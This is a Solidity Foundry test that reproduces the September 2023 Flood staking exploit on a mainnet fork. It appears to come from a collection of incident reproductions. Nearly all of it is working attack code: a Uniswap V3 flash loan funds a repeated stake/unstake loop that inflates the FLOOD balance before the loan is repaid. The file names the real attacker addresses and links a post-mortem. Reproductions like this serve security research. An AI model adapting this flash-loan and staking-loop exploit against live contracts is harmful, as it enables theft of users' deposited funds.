// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo -- Total Lost : ~40 eth
// Attacker : https://etherscan.io/address/0x4453aed57c23a50d887a42ad0cd14ff1b819c750
// Attack Contract : https://etherscan.io/address/0x6ce5a85cff4c70591da82de5eb91c3fa38b40595
// Attacker Transaction : https://explorer.phalcon.xyz/tx/eth/0x1274b32d4dfacd2703ad032e8bd669a83f012dde9d27ed92e4e7da0387adafe4

// @Analysis
// https://twitter.com/PeckShieldAlert/status/1698962105058361392
// https://publication.floor.xyz/floor-post-mortem-incident-summary-september-5-2023-e054a2d5afa4


interface IFloodStaking {
    function unstake(
        address _to,
        uint256 _amount,
        bool _trigger,
        bool _rebasing
    ) external;
    function stake(
        address _to,
        uint256 _amount,
        bool _rebasing,
        bool _claim
    ) external returns (uint256);
}

interface IUniswapv3 {
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;

    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}


contract FloodStakingExploit is Test {
    IERC20 flood = IERC20(0xf59257E961883636290411c11ec5Ae622d19455e);
    IERC20 gFlood = IERC20(0xb1Cc59Fc717b8D4783D41F952725177298B5619d);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    IFloodStaking staking = IFloodStaking(0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539);
    IUniswapv3 floodUniPool = IUniswapv3(0xB386c1d831eED803F5e8F274A59C91c4C22EEAc0);


    function setUp() public {
        vm.createSelectFork("https://eth.llamarpc.com", 18068772);

        vm.label(address(flood), "FLOOD");
        vm.label(address(gFlood), "gFlood");
    }

    function test_Flash() public {
        flood.approve(address(staking), type(uint256).max);
        IUniswapv3(0xB386c1d831eED803F5e8F274A59C91c4C22EEAc0).flash(address(this), 0, 152089813098498, '');
      
        console2.log("sell flood, balance", flood.balanceOf(address(this)));
        //IUniswapv3(0xB386c1d831eED803F5e8F274A59C91c4C22EEAc0).swap(attacker, false,int256( 2000), 1461446485210103287273052203988822378723970341, '');
    }

    function uniswapV3FlashCallback(uint256 t0 , uint256 t1, bytes calldata) external {
        while(true) {
            uint256 base = flood.balanceOf(address(this));
            staking.stake(address(this), base, false, true);
            staking.unstake(address(this), gFlood.balanceOf(address(this)), true, false);
            if( base >= 168129055504376) {
                break;
            }
        }

        flood.transfer(msg.sender, 153610711229483);
        console2.log("flood balance after ", flood.balanceOf(address(this)));
        console2.log("gflood balance after", gFlood.balanceOf(address(this)));

    }
}